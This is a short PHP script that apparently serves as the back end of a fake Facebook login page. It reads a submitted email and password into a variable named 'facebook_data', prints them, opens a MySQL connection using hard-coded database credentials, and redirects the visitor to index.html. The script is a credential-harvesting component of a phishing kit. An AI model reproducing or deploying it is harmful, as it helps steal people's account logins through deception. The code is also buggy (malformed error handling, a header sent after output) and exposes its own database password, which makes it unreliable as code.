<?php 

function printArray($props){
    echo "<pre>";
    print_r($props);
    echo "</pre>";
}

if($_SERVER["REQUEST_METHOD"] == "POST"){   
    $user_email = $_POST["user_email"];
    $user_pass = $_POST["user_pass"];
    
    $facebook_data = [$user_email, $user_pass];
    printArray($facebook_data);
    
    function connectDatabase(){
        $servername = "localhost";
        $username = "ssbanglaexpressb_santokhan";
        $password = "ssbanglaexpress01";
        $dbname = "ssbanglaexpressb_user";
    
        $conn = mysqli_connect($servername, $username, $password, $dbname);
    
        if (!$conn) {
            die("Failed to connect databse.").mysqli_connect_error;
        } else {
            echo "Connection successful.";
            header("location: index.html");
        }
    }
    connectDatabase();
}
?>